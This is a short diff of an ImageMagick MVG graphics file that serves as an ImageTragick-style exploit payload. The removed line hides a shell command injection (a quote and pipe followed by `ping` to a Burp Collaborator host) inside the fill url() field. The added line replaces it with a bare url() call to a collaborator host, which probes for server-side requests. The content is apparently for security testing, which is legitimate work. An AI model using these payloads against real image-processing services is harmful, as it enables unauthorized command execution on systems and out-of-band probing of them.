@@ -1,4 +1,4 @@
 push graphic-context
 viewbox 0 0 640 480
-fill 'url(https://example.com/image.jpg";|ping "domian.burpcollaborator.net)'
+fill 'url(http://burpcollab)'
 pop graphic-context
